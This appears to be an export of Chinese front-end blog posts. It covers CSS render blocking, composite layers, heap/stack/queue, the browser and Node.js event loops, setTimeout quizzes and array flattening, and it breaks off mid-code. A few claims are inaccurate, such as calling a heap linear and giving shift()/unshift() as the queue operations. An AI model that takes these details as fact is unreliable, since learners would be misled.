然后再说下几个现象： css加载不会阻塞DOM树解析（异步加载时DOM照常构建） 但会阻塞render树渲染（渲染时需等css加载完毕，因为render树需要css信息） 这可能也是浏览器的一种优化机制。 因为你加载css的时候，可能会修改下面DOM节点的样式，如果css加载不阻塞render树渲染的话，那么当css加载完之后，render树可能又得重新重绘或者回流了，这就造成了一些没有必要的损耗。所以干脆就先把DOM树的结构先解析完，把可以做的工作做完，然后等你css加载完之后，在根据最终的样式来渲染render树，这种做法性能方面确实会比较好一点。 普通图层和复合图层渲染步骤中就提到了composite概念。 可以简单的这样理解，浏览器渲染的图层一般包含两大类：普通图层以及复合图层 首先，普通文档流内可以理解为一个复合图层（这里称为默认复合层，里面不管添加多少元素，其实都是在同一个复合图层中） 其次，absolute布局（fixed也一样），虽然可以脱离普通文档流，但它仍然属于默认复合层。 然后，可以通过硬件加速的方式，声明一个新的复合图层，它会单独分配资源 （当然也会脱离普通文档流，这样一来，不管这个复合图层中怎么变化，也不会影响默认复合层里的回流重绘） 可以简单理解下：GPU中，各个复合图层是单独绘制的，所以互不影响，这也是为什么某些场景硬件加速效果一级棒 可以Chrome源码调试 -&gt; More Tools -&gt; Rendering -&gt; Layer borders中看到，黄色的就是复合图层信息 如下图。可以验证上述的说法 如何变成复合图层（硬件加速）将该元素变成一个复合图层，就是传说中的硬件加速技术 最常用的方式：translate3d、translateZ opacity属性/过渡动画（需要动画执行的过程中才会创建合成层，动画没有开始或结束后元素还会回到之前的状态） will-chang属性（这个比较偏僻），一般配合opacity与translate使用（而且经测试，除了上述可以引发硬件加速的属性外，其它属性并不会变成复合层）， 作用是提前告诉浏览器要变化，这样浏览器会开始做一些优化工作（这个最好用完后就释放） &lt;video&gt;&lt;iframe&gt;&lt;canvas&gt;&lt;webgl&gt;等元素 其它，譬如以前的flash插件 absolute和硬件加速的区别 可以看到，absolute虽然可以脱离普通文档流，但是无法脱离默认复合层。所以，就算absolute中信息改变时不会改变普通文档流中render树，但是，浏览器最终绘制时，是整个复合层绘制的，所以absolute中信息的改变，仍然会影响整个复合层的绘制。（浏览器会重绘它，如果复合层中内容多，absolute带来的绘制信息变化过大，资源消耗是非常严重的） 而硬件加速直接就是在另一个复合层了（另起炉灶），所以它的信息改变不会影响默认复合层 （当然了，内部肯定会影响属于自己的复合层），仅仅是引发最后的合成（输出视图） 硬件加速时请使用index 使用硬件加速时，尽可能的使用index，防止浏览器默认给后续的元素创建复合层渲染 具体的原理时这样的：webkit CSS3中，如果这个元素添加了硬件加速，并且index层级比较低，那么在这个元素的后面其它元素（层级比这个元素高的，或者相同的，并且releative或absolute属性相同的），会默认变为复合层渲染，如果处理不当会极大的影响性能 简单点理解，其实可以认为是一个隐式合成的概念：如果a是一个复合图层，而且b在a上面，那么b也会被隐式转为一个复合图层，这点需要特别注意 另外，这个问题可以在这个地址看到重现（原作者分析的挺到位的，直接上链接）：http://web.jobbole.com/83575/ CSS3硬件加速需注意事项 堆，栈、队列 堆（Heap） 堆是一种数据结构，是利用完全二叉树维护的一组数据，堆分为两种，一种为最大堆，一种为最小堆，将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆。堆是线性数据结构，相当于一维数组，有唯一后继。 最大堆 eg: 栈（Stack） 后进先出，存储基本数据类型和对象的指针，有 push() 和 pop() 这两个方法 栈在计算机科学中是限定仅在表尾进行插入或删除操作的线性表。 栈是一种数据结构，它按照后进先出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据栈是只能在某一端插入和删除的特殊线性表。 JavaScript 中的内存分为 堆内存 (heap) 和 栈内存 (stack) JavaScript 中引用类型值的大小是不固定的，因此它们会被存储到 堆内存 中。JavaScript 不允许直接访问堆内存中的位置，因此我们不能直接操作对象的堆内存空间，而是操作 对象的引用。 而 JavaScript 中的基础数据类型都有固定的大小，因此它们被存储到 栈内存 中，由系统自动分配存储空间。我们可以直接操作保存在栈内存空间的值，因此基础数据类型都是 按值访问。此外，栈内存还会存储 对象的引用 (指针) 以及 函数执行时的运行空间。 两种存储方式的不同: 栈内存 堆内存 存储基础数据类型 存储引用数据类型 按值访问 按引用访问 存储的值大小固定 存储的值大小不定，可动态调整 由系统自动分配内存空间 由程序员通过代码进行分配 主要用来执行程序 主要用来存放对象 空间小，运行效率高 空间大，但是运行效率相对较低 先进后出，后进先出 无序存储，可根据引用直接获取 队列（Queue） 后进后出，有 shift() 和 unshift() 这两个方法 特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。 队列中没有元素时，称为空队列。 队列的数据元素又称为队列元素。在队列中插入一个队列元素称为入队，从队列中删除一个队列元素称为出队。因为队列只允许在一端插入，在另一端删除，所以只有最早进入队列的元素才能最先从队列中删除，故队列又称为先进先出（FIFO—first in first out） Event Loop在JavaScript中，任务被分为两种，一种宏任务（MacroTask）也叫Task，一种叫微任务（MicroTask）。 MacroTask（宏任务） script全部代码、setTimeout、setInterval、setImmediate（Node.js,浏览器暂时不支持，只有IE10支持，具体可见MDN）、I/O、UI Rendering、postMessage、MessageChannel、requestAnimationFrame。 # 浏览器 Node I/O ✅ ✅ setTimeout ✅ ✅ setInterval ✅ ✅ setImmediate ❌ ✅ postMessage ✅ ✅ MessageChannel ✅ ✅ requestAnimationFrame ✅ ❌ UI Rendering ✅ ❌ 有些地方会列出来UI Rendering，说这个也是宏任务，可是在HTML规范文档中，发现这很显然是和微任务平行的一个操作步骤 requestAnimationFrame姑且也算是宏任务吧，requestAnimationFrame在MDN的定义为，下次页面重绘前所执行的操作，而重绘也是作为宏任务的一个步骤来存在的，且该步骤晚于微任务的执行 MicroTask（微任务） Process.nextTick（Node.js）、Promise.then catch finally、Object.observe(废弃)、MutationObserver（具体使用方式查看这里） # 浏览器 Node process.nextTick ❌ ✅ Promise.then catch finally ✅ ✅ MutationObserver ✅ ❌ Object.observe ✅ ❌ 浏览器中的Event Loop JS分为同步任务和异步任务 同步任务都在主线程上执行，形成一个执行栈 主线程之外，事件触发线程管理着一个任务队列，只要异步任务有了运行结果，就在任务队列之中放置一个事件。 一旦执行栈中的所有同步任务执行完毕（此时JS引擎空闲），系统就会读取任务队列，将可运行的异步任务添加到可执行栈中，开始执行。 执行栈当我们调用一个方法的时候，JavaScript 会生成一个与这个方法对应的执行环境，又叫执行上下文(context)。这个执行环境中保存着该方法的私有作用域、上层作用域(作用域链)、方法的参数，以及这个作用域中定义的变量和 this 的指向，而当一系列方法被依次调用的时候。由于 JavaScript 是单线程的，这些方法就会按顺序被排列在一个单独的地方，这个地方就是所谓执行栈。JS调用栈采用的是后进先出的规则，当函数执行的时候，会被添加到栈的顶部，当执行栈执行完成后，就会从栈顶移出，直到栈内被清空。 任务队列事件队列是一个存储着 异步任务 的队列，其中的任务严格按照时间先后顺序执行，排在队头的任务将会率先执行，而排在队尾的任务会最后执行。事件队列每次仅执行一个任务，在该任务执行完毕之后，再执行下一个任务。执行栈则是一个类似于函数调用栈的运行容器，当执行栈为空时，JS 引擎便检查事件队列，如果事件队列不为空的话，事件队列便将第一个任务压入执行栈中运行。 事件循环我们注意到，在异步代码完成后仍有可能要在一旁等待，因为此时程序可能在做其他的事情，等到程序空闲下来才有时间去看哪些异步已经完成了。所以 JavaScript 有一套机制去处理同步和异步操作，那就是事件循环 (Event Loop)。 执行栈在执行完同步任务后，查看执行栈是否为空，如果执行栈为空，就会去检查微任务(microTask)队列是否为空，如果为空的话，就执行Task（宏任务），否则就一次性执行完所有微任务。 每次单个宏任务执行完毕后，检查微任务(microTask)队列是否为空，如果不为空的话，会按照先入先出的规则全部执行完微任务(microTask)后，设置微任务(microTask)队列为null，然后再执行宏任务，如此循环。 测试题01 123456789101112131415161718setTimeout(() =&gt; &#123; console.log('A');&#125;, 0);var obj = &#123; func: function() &#123; setTimeout(function() &#123; console.log('B'); &#125;, 0); return new Promise(function(resolve) &#123; console.log('C'); resolve(); &#125;); &#125;,&#125;;obj.func().then(function() &#123; console.log('D');&#125;);console.log('E'); 第一个 setTimeout 放到宏任务队列，此时宏任务队列为 [‘A’] 接着执行 obj 的 func 方法，将 setTimeout 放到宏任务队列，此时宏任务队列为 [‘A’, ‘B’] 函数返回一个 Promise，因为这是一个同步操作，所以先打印出 ‘C’ 接着将 then 放到微任务队列，此时微任务队列为 [‘D’] 接着执行同步任务 console.log(‘E’);，打印出 ‘E’ 因为微任务优先执行，所以先输出 ‘D’ 最后依次输出 ‘A’ 和 ‘B’ 测试题02 123456let p = new Promise(resolve =&gt; &#123; resolve(1); Promise.resolve().then(() =&gt; console.log(2)); console.log(4);&#125;).then(t =&gt; console.log(t));console.log(3); 首先将 Promise.resolve() 的 then() 方法放到微任务队列，此时微任务队列为 [‘2’] 然后打印出同步任务 4 接着将 p 的 then() 方法放到微任务队列，此时微任务队列为 [‘2’, ‘1’] 打印出同步任务 3 最后依次打印微任务 2 和 1 测试题03 1234567891011async function foo() &#123; // await 前面的代码 await bar(); // await 后面的代码&#125;async function bar() &#123; // do something...&#125;foo(); async/await 仅仅是生成器的语法糖，只要把它转换成 Promise 的形式即可。 其中 await 前面的代码 是同步的，调用此函数时会直接执行；而 await bar(); 这句可以被转换成 Promise.resolve(bar())；await 后面的代码 则会被放到 Promise 的 then() 方法里。因此上面的代码可以被转换成如下形式，这样是不是就很清晰了？ 123456789101112function foo() &#123; // await 前面的代码 Promise.resolve(bar()).then(() =&gt; &#123; // await 后面的代码 &#125;);&#125;function bar() &#123; // do something...&#125;foo(); NodeJS的Event LoopNode.js也是单线程的Event Loop，但是它的运行机制不同于浏览器环境。 Node 中的 Event Loop 和浏览器中的是完全不相同的东西。Node.js采用V8作为js的解析引擎，而I/O处理方面使用了自己设计的libuv，libuv是一个基于事件驱动的跨平台抽象层，libuv使用异步，事件驱动的编程方式，核心是提供i/o的事件循环和异步回调。libuv的API包含有时间，非阻塞的网络，异步文件操作，子进程等等。 Event Loop就是在libuv中实现的。 Node.js的运行机制如下: V8引擎解析JavaScript脚本。 解析后的代码，调用Node API。 libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。 V8引擎再将结果返回给用户。 Node的Event loop一共分为6个阶段，每个细节具体如下： timers 阶段：这个阶段执行timer（setTimeout、setInterval）中到期的回调 pending callback: 上一轮循环中少数的callback会放在这一阶段执行。 idle, prepare 阶段：仅node内部使用 poll 阶段：获取新的I/O事件, 适当的条件下node将阻塞在这里 check 阶段：执行 setImmediate() 的回调(setImmediate()是将事件插入到事件队列尾部，主线程和事件队列的函数执行完成之后立即执行setImmediate指定的回调函数)的callback。） close callbacks 阶段：执行 socket 的 close 事件回调，例如socket.on(&#39;close&#39;[,fn])或者http.server.on(&#39;close, fn)。 timers 执行setTimeout和setInterval中到期的callback，并且是由 poll 阶段控制的，执行这两者回调需要设置一个毫秒数，理论上来说，应该是时间一到就立即执行callback回调，但是由于system的调度可能会延时，达不到预期时间，只能是尽快执行 pending callbacks 此阶段执行某些系统操作（例如TCP错误类型）的回调。 例如，如果TCP socket ECONNREFUSED在尝试connect时receives，则某些* nix系统希望等待报告错误。 这将在pending callbacks阶段执行。 poll 该poll阶段有两个主要功能： 执行I/O回调。 处理轮询队列中的事件。 当事件循环进入poll阶段并且在timers中没有可以执行定时器时，将发生以下两种情况之一 如果poll队列不为空，则事件循环将遍历其同步执行它们的callback队列，直到队列为空，或者达到system-dependent（系统相关限制）。 如果poll队列为空，则会发生以下两种情况之一 如果有setImmediate()回调需要执行，则会立即停止执行poll阶段并进入执行check阶段以执行回调。 如果没有setImmediate()回到需要执行，poll阶段将等待callback被添加到队列中，然后立即执行。 当然设定了 timer 的话且 poll 队列为空，则会判断是否有 timer 超时，如果有的话会回到 timer 阶段执行回调。 check 此阶段允许人员在poll阶段完成后立即执行回调。 如果poll阶段闲置并且script已排队setImmediate()，则事件循环到达check阶段执行而不是继续等待。 setImmediate()实际上是一个特殊的计时器，它在事件循环的一个单独阶段运行。它使用libuv API来调度在poll阶段完成后执行的回调。 通常，当代码被执行时，事件循环最终将达到poll阶段，它将等待传入连接，请求等。但是，如果已经调度了回调setImmediate()，并且轮询阶段变为空闲，则它将结束并且到达check阶段，而不是等待poll事件。 1234567891011121314151617console.log('start')setTimeout(() =&gt; &#123; console.log('timer1') Promise.resolve().then(function() &#123; console.log('promise1') &#125;)&#125;, 0)setTimeout(() =&gt; &#123; console.log('timer2') Promise.resolve().then(function() &#123; console.log('promise2') &#125;)&#125;, 0)Promise.resolve().then(function() &#123; console.log('promise3')&#125;)console.log('end') 如果node版本为v11.x， 其结果与浏览器一致。1234567startendpromise3timer1promise1timer2promise2 如果v10版本上述结果存在两种情况： 如果time2定时器已经在执行队列中了 1234567startendpromise3timer1timer2promise1promise2 如果time2定时器没有在执行对列中，执行结果为 1234567startendpromise3timer1promise1timer2promise2 具体情况可以参考poll阶段的两种情况。 从下图可能更好理解： setImmediate() 的setTimeout()的区别 setImmediate和setTimeout()是相似的，但根据它们被调用的时间以不同的方式表现。 setImmediate()设计用于在当前poll阶段完成后check阶段执行脚本 。 setTimeout() 安排在经过最小（ms）后运行的脚本，在timers阶段执行。 举个例子:1234567setTimeout(() =&gt; &#123; console.log('timeout');&#125;, 0);setImmediate(() =&gt; &#123; console.log('immediate');&#125;); 执行定时器的顺序将根据调用它们的上下文而有所不同。 如果从主模块中调用两者，那么时间将受到进程性能的限制。 其结果也不一致 如果在I / O周期内移动两个调用，则始终首先执行立即回调：12345678910const fs = require('fs');fs.readFile(__filename, () =&gt; &#123; setTimeout(() =&gt; &#123; console.log('timeout'); &#125;, 0); setImmediate(() =&gt; &#123; console.log('immediate'); &#125;);&#125;); 其结果可以确定一定是immediate =&gt; timeout。主要原因是在I/O阶段读取文件后，事件循环会先进入poll阶段，发现有setImmediate需要执行，会立即进入check阶段执行setImmediate的回调。然后再进入timers阶段，执行setTimeout，打印timeout。 123456789101112131415161718 ┌───────────────────────────┐┌─&gt;│ timers ││ └─────────────┬─────────────┘│ ┌─────────────┴─────────────┐│ │ pending callbacks ││ └─────────────┬─────────────┘│ ┌─────────────┴─────────────┐│ │ idle, prepare ││ └─────────────┬─────────────┘ ┌───────────────┐│ ┌─────────────┴─────────────┐ │ incoming: ││ │ poll │&lt;─────┤ connections, ││ └─────────────┬─────────────┘ │ data, etc. ││ ┌─────────────┴─────────────┐ └───────────────┘│ │ check ││ └─────────────┬─────────────┘│ ┌─────────────┴─────────────┐└──┤ close callbacks │ └───────────────────────────┘ Process.nextTick() process.nextTick()虽然它是异步API的一部分，但未在图中显示。这是因为process.nextTick()从技术上讲，它不是事件循环的一部分。 process.nextTick()方法将 callback 添加到next tick队列。 一旦当前事件轮询队列的任务全部完成，在next tick队列中的所有callbacks会被依次调用。 换种理解方式： 当每个阶段完成后，如果存在 nextTick 队列，就会清空队列中的所有回调函数，并且优先于其他 microtask 执行。 镇楼题答案 首先打印出 script start 接着将 settimeout 添加到宏任务队列，此时宏任务队列为 [‘settimeout’] 然后执行函数 async1，先打印出 async1 start，又因为 Promise.resolve(async2()) 是同步任务，所以打印出 async2，接着将 async1 end 添加到微任务队列，，此时微任务队列为 [‘async1 end’] 接着打印出 promise1，将 promise2 添加到微任务队列，，此时微任务队列为 [‘async1 end’, promise2] 打印出 script end 因为微任务优先级高于宏任务，所以先依次打印出 async1 end 和 promise2 最后打印出宏任务 settimeout 参考： 从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理一次弄懂Event Loop浏览器与Node的事件循环(Event Loop)有何区别?微任务、宏任务与Event-Loop最后一次搞懂 Event LoopEvent Loop的规范和实现Eventloop不可怕，可怕的是遇上Promise","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://jiuylq.github.io/tags/Javascript/"}]},{"title":"setTimeout你应该知道的秘密","slug":"setTimeout","date":"2019-03-13T08:31:09.000Z","updated":"2019-04-07T05:23:49.305Z","comments":true,"path":"2019/03/13/setTimeout/","link":"","permalink":"https://jiuylq.github.io/2019/03/13/setTimeout/","excerpt":"计时器setTimeout是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。","text":"计时器setTimeout是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。 setTimeout你应该知道的秘密计时器setTimeout是我们经常会用到的，它用于在指定的毫秒数后调用函数或计算表达式。 语法：1setTimeout(code, millisec, args) 注意：如果code为字符串，相当于执行eval()方法来执行code。著作权归作者所有。 setTimeout原理先来看一段代码：12345678var start = new Date();var end = 0;setTimeout(function() &#123; console.log(new Date() - start);&#125;, 500);while (new Date() - start &lt;= 1000) &#123;&#125; 在上面的代码中，定义了一个setTimeout定时器，延时时间是500毫秒。你是不是觉得打印结果是： 500 可事实却是出乎你的意料，打印结果是这样的（也许你打印出来会不一样，但肯定会大于1000毫秒）：这是为毛呢？ 究其原因，这是因为 JavaScript是单线程执行的。也就是说，在任何时间点，有且只有一个线程在运行JavaScript程序，无法同一时候运行多段代码。 再来看看浏览器下的JavaScript。 浏览器的内核是多线程的，它们在内核控制下相互配合以保持同步，一个浏览器至少实现三个常驻线程：JavaScript引擎线程，GUI渲染线程，浏览器事件触发线程。 JavaScript引擎是基于事件驱动单线程执行的，JavaScript引擎一直等待着任务队列中任务的到来，然后加以处理，浏览器无论什么时候都只有一个JavaScript线程在运行JavaScript程序。 GUI渲染线程负责渲染浏览器界面，当界面需要重绘（Repaint）或由于某种操作引发回流(Reflow)时，该线程就会执行。但需要注意，GUI渲染线程与JavaScript引擎是互斥的，当JavaScript引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JavaScript引擎空闲时立即被执行。 事件触发线程，当一个事件被触发时，该线程会把事件添加到待处理队列的队尾，等待JavaScript引擎的处理。这些事件可来自JavaScript引擎当前执行的代码块如setTimeout、也可来自浏览器内核的其他线程如鼠标点击、Ajax异步请求等，但由于JavaScript的单线程关系，所有这些事件都得排队等待JavaScript引擎处理（当线程中没有执行任何同步代码的前提下才会执行异步代码）。 到这里，我们再来回顾一下最初的例子： 虽然setTimeout的延时时间是500毫秒，可是由于while循环的存在，只有当间隔时间大于1000毫秒时，才会跳出while循环，也就是说，在1000毫秒之前，while循环都在占据着JavaScript线程。也就是说，只有等待跳出while后，线程才会空闲下来，才会去执行之前定义的setTimeout。 最后 ，我们可以总结出，setTimeout只能保证在指定的时间后将任务(需要执行的函数)插入任务队列中等候，但是不保证这个任务在什么时候执行。一旦执行javascript的线程空闲出来，自行从队列中取出任务然后执行它。 因为javascript线程并没有因为什么耗时操作而阻塞，所以可以很快地取出排队队列中的任务然后执行它，也是这种队列机制，给我们制造一个异步执行的假象。 setTimeout的好搭档“0”下面有一段代码：123setTimeout(function()&#123; // statement&#125;, 0); 上面的代码表示立即执行。 本意是立刻执行调用函数，但事实上，上面的代码并不是立即执行的，这是因为setTimeout有一个最小执行时间，当指定的时间小于该时间时，浏览器会用最小允许的时间作为setTimeout的时间间隔，也就是说即使我们把setTimeout的延迟时间设置为0，被调用的程序也没有马上启动。 不同的浏览器实际情况不同，IE8和更早的IE的时间精确度是15.6ms。不过，随着HTML5的出现，在高级版本的浏览器（Chrome、ie9+等），定义的最小时间间隔是不得低于4毫秒，如果低于这个值，就会自动增加，并且在2010年及之后发布的浏览器中采取一致。 所以说，当我们写为 setTimeout(fn,0) 的时候，实际是实现插队操作，要求浏览器“尽可能快”的进行回调，但是实际能多快就完全取决于浏览器了。 那setTimeout(fn, 0)有什么用处呢？其实用处就在于我们可以改变任务的执行顺序！因为浏览器会在执行完当前任务队列中的任务，再执行setTimeout队列中积累的的任务。 通过设置任务在延迟到0s后执行，就能改变任务执行的先后顺序，延迟该任务发生，使之异步执行。 来看一个网上很流行的例子： 12345678document.querySelector('#one input').onkeydown = function() &#123; document.querySelector('#one span').innerHTML = this.value;&#125;; document.querySelector('#second input').onkeydown = function() &#123; setTimeout(function() &#123; document.querySelector('#second span').innerHTML = document.querySelector('#second input').value; &#125;, 0);&#125;; 当你往两个表单输入内容时，你会发现未使用setTimeout函数的只会获取到输入前的内容，而使用setTimeout函数的则会获取到输入的内容。 这是为什么呢？ 因为当按下按键的时候，JavaScript 引擎需要执行 keydown 的事件处理程序，然后更新文本框的 value 值，这两个任务也需要按顺序来，事件处理程序执行时，更新 value值（是在keypress后）的任务则进入队列等待，所以我们在 keydown 的事件处理程序里是无法得到更新后的value的，而利用 setTimeout(fn, 0)，我们把取 value 的操作放入队列，放在更新 value 值以后，这样便可获取出文本框的值。 未使用setTimeout函数，执行顺序是：onkeydown =&gt; onkeypress =&gt; onkeyup 使用setTimeout函数，执行顺序是：onkeydown =&gt; onkeypress =&gt; function =&gt; onkeyup 虽然我们可以使用keyup来替代keydown，不过有一些问题，那就是长按时，keyup并不会触发。 长按时，keydown、keypress、keyup的调用顺序：keydown =&gt; keypress =&gt; keydown =&gt; keypress =&gt; ... =&gt; keyup 也就是说keyup只会触发一次，所以你无法用keyup来实时获取值。 我们还可以用setImmediate()来替代setTimeout(fn,0)：123456if (!window.setImmediate) &#123; window.setImmediate = function(func, args)&#123; return window.setTimeout(func, 0, args); &#125;; window.clearImmediate = window.clearTimeout; &#125; setImmediate()方法用来把一些需要长时间运行的操作放在一个回调函数里，在浏览器完成后面的其他语句后，就立刻执行这个回调函数，必选的第一个参数func，表示将要执行的回调函数，它并不需要时间参数。 注意：目前只有IE10支持此方法，当然，在Nodejs中也可以调用此方法。 setTimeout的一些秘密1、setTimeout中回调函数的this 由于setTimeout() 方法是浏览器 window 对象提供的，因此第一个参数函数中的this其实是指向window对象，这跟变量的作用域有关。 看个例子：12345678910var a = 1;var obj = &#123; a: 2, test: function() &#123; setTimeout(function()&#123; console.log(this.a); &#125;, 0); &#125;&#125;; obj.test(); // 1 不过我们可以通过使用bind()方法来改变setTimeout回调函数里的this 12345678910var a = 1;var obj = &#123; a: 2, test: function() &#123; setTimeout(function()&#123; console.log(this.a); &#125;.bind(this), 0); &#125;&#125;;obj.test(); // 2 相关文章：JS中的call、apply、bind方法 2、setTimeout不止两个参数 我们都知道，setTimeout的第一个参数是要执行的回调函数，第二个参数是延迟时间（如果省略，会由浏览器自动设置。在IE，FireFox中，第一次配可能给个很大的数字，100ms上下，往后会缩小到最小时间间隔，Safari，chrome，opera则多为10ms上下。） 其实，setTimeout可以传入第三个参数、第四个参数….，它们表示神马呢？其实是用来表示第一个参数（回调函数）传入的参数。1234setTimeout(function(a, b)&#123; console.log(a); // 3 console.log(b); // 4&#125;,0, 3, 4); setTimeout常规面试题 重点考察setTimeout的执行顺序和闭包(JavaScript执行机制，Eventloop) 1、问：以下函数的输出结果什么,为什么？ 12345678var fn = function() &#123; for (var i = 0; i &lt; 4; i++) &#123; setTimeout(function() &#123; console.log(i) &#125;, 10) &#125;&#125;fn() 答案：1234// 4// 4// 4// 4 相信了解过setTimeout的人都知道setTimeout执行的是一个异步代码，只有在当主线程空闲的时候才会执行异步代码，for循环进入主线程执行，settimeout事件进入任务队列等待主线程空闲才会执行，所以打印出来的i是循环结束后的结果，都为4 2、问：以下函数的输出结果什么？ 12345678var fn = function() &#123; for (var i = 0; i &lt; 4; i++) &#123; setTimeout(function() &#123; console.log(i) &#125;, 0) &#125;&#125;fn() 答案同上一题,（延申：如何让setTimeout打印的结果为0，1，2，3呢，思路利用闭包） 123456789101112131415161718192021// 1var fn1 = function() &#123; for (var i = 0; i &lt; 4; i++) &#123; (function(i)&#123; setTimeout(function() &#123; console.log(i) &#125;, 0) &#125;)(i) &#125;&#125;fn1()// 2var fn2 = function() &#123; for (var i = 0; i &lt; 4; i++) &#123; setTimeout(function(i) &#123; console.log(i) &#125;, 0, i) &#125;&#125;fn2() 3、继续问：以下函数的输出结果什么？ 12345678910var fn = function() &#123; for (var i = 0; i &lt; 4; i++) &#123; var t = setTimeout(function(i) &#123; console.log(i) // console.log(t) clearTimeout(t) &#125;, 10, i) &#125;&#125;fn() 答案：123// 0// 1// 2 为什么：这个t是定义在闭包外面的，也就是说t并没有被闭包保存，所以这里的t指的是最后一个循环留下来的t，所以最后一个3被清除了，没有输出。 4、还是问：以下函数输出的结果为？为什么？ 1234567for (var i = 0; i &lt; 4; i++) &#123; var t = setTimeout(function(i, t) &#123; console.log(i) console.log(t) clearTimeout(t) &#125;, 10, i, t)&#125; 答案：1234567891011// undefined// 0// t// 1// t// 2// t// 3 为什么：t被引用到闭包里面保持起来了，每次清除的是上一次的setTimeout，因为初始的t被定义了但没值，所以为undefined 下面一题有待研究：按理说答案应该同上的12345678910111213141516171819202122var fn = function() &#123; for (var i = 0; i &lt; 4; i++) &#123; var t = setTimeout(function(i, t) &#123; console.log(i) console.log(t) clearTimeout(t) &#125;, 10, i, t) &#125;&#125;fn()// undefined// 0// undefined// 1// t// 2// t// 3 5、继续问：以下函数输出的结果为？ 123456789function fn()&#123; for(var i=0;i&lt;4;i++)&#123; var t = setInterval(function(i,t)&#123; console.log(i) clearInterval(t) &#125;,10,i,t); &#125;&#125;fn() 答案：1// 0,1,2,3,3,3,3,3... 参考：你应该知道的setTimeout秘密js同步和异步几个让我印象深刻的面试题(一)","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://jiuylq.github.io/tags/Javascript/"}]},{"title":"数组扁平化","slug":"delayering","date":"2019-03-09T16:00:00.000Z","updated":"2019-04-07T05:23:25.353Z","comments":true,"path":"2019/03/10/delayering/","link":"","permalink":"https://jiuylq.github.io/2019/03/10/delayering/","excerpt":"数组扁平化 将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型)","text":"数组扁平化 将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型) 数组扁平化 数组扁平化 将一个多维数组转换为一维数组；扁平化不改变原数据类型(即数组里的每个数据的类型) 12var arr = [1,[2,3,[4,5,[6,7]]],8];//扁平化之后：[1,2,3,4,5,6,7,8]; 1、递归 *循环数组元素，如果还是一个数组，就递归调用该方法 123456789101112131415var arr = [1,[2,3,[4,5,[6,7]]],8];function flatten(arr)&#123; var result = []; for(var i = 0; i &lt; arr.length; i++)&#123; if(Array.isArray(arr[i]))&#123; result = result.concat(flatten(arr[i])) &#125;else&#123; result.push(arr[i]); &#125;; &#125;; return result;&#125;console.log(flatten(arr)) *指定了depth作为扁平化的深度 123456789101112131415161718192021var arr = [1,[2,3,[4,5,[6,7]]],8];function flattenDepth(array, depth=1) &#123; let result = []; array.forEach (item =&gt; &#123; let d = depth; if(Array.isArray(item) &amp;&amp; d &gt; 0)&#123; result.push(...(flattenDepth(item, --d))) &#125; else &#123; result.push(item); &#125; &#125;) return result;&#125;console.log(flattenDepth(arr))// [1, 2, 3,[4,5,[6,7]]] , 8]console.log(flattenDepth(arr,2))//[1, 2, 3, 4, 5, [6,7], 8]console.log(flattenDepth(arr,3))//[1, 2, 3, 4, 5, 6, 7, 8] 2、reduce 既然是对数组进行处理，最终返回一个值，我们就可以考虑使用 reduce 来简化代码： 12345678910var arr = [1,[2,3,[4,5,[6,7]]],8];function flatten(arr) &#123; return arr.reduce(function(prev, next)&#123; return prev.concat(Array.isArray(next) ? flatten(next) : next) &#125;, [])&#125;console.log(flatten(arr));//[1, 2, 3, 4, 5, 6, 7, 8] 3、ES6 扩展运算符(…) ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中： 123var arr = [1,[2,3,[4,5,[6,7]]],8];console.log([].concat(...arr));//[1, 2, 3, [4, 5, [6, 7]], 8] 我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法： 1234567891011var arr = [1,[2,3,[4,5,[6,7]]],8];function flatten(arr) &#123; while (arr.some(item =&gt; Array.isArray(item))) &#123; arr = [].concat(...arr); &#125; return arr;&#125;console.log(flatten(arr))//[1, 2, 3, 4, 5, 6, 7, 8] 4、toString 如果数组的元素都是数字，那么我们可以考虑使用 toString 方法，因为： 123var arr = [1,[2,3,[4,5,[6,7]]],8];arr.toString();// \"1,2,3,4,5,6,7,8\" 调用 toString 方法，返回了一个逗号分隔的扁平的字符串，这时候我们再 split，然后转成数字不就可以实现扁平化了吗？ 12345678910var arr = [1,[2,3,[4,5,[6,7]]],8];function flatten(arr) &#123; return arr.toString().split(',').map(function(item)&#123; return +item &#125;)&#125;console.log(flatten(arr))//[1, 2, 3, 4, 5, 6, 7, 8] 5、join 123var arr = [1,[2,3,[4,5,[6,7]]],8];arr.join(',').split(',');//[1, 2, 3, 4, 5, 6, 7, 8] 6、undercore 那么如何写一个抽象的扁平函数，来方便我们的开发呢，所有又到了我们抄袭 underscore 的时候了~ 在这里直接给出源码和注释，但是要注意，这里的 flatten 函数并不是最终的 _.flatten，为了方便多个 API 进行调用，这里对扁平进行了更多的配置。 123456789101112131415161718192021222324252627282930313233343536373839/** * 数组扁平化 * @param &#123;Array&#125; input 要处理的数组 * @param &#123;boolean&#125; shallow 是否只扁平一层 * @param &#123;boolean&#125; strict 是否严格处理元素，下面有解释 * @param &#123;Array&#125; output 这是为了方便递归而传递的参数 * 源码地址：https://github.com/jashkenas/underscore/blob/master/underscore.js#L528 */function flatten(input, shallow, strict, output) &#123; // 递归使用的时候会用到output output = output || []; var idx = output.length; for (var i = 0, len = input.length; i &lt; len; i++) &#123; var value = input[i]; // 如果是数组，就进行处理 if (Array.isArray(value)) &#123; // 如果是只扁平一层，遍历该数组，依此填入 output if (shallow) &#123; var j = 0, lenn = value.length; while (j &lt; lenn) output[idx++] = value[j++]; &#125; // 如果是全部扁平就递归，传入已经处理的 output，递归中接着处理 output else &#123; flatten(value, shallow, strict, output); idx = output.length; &#125; &#125; // 不是数组，根据 strict 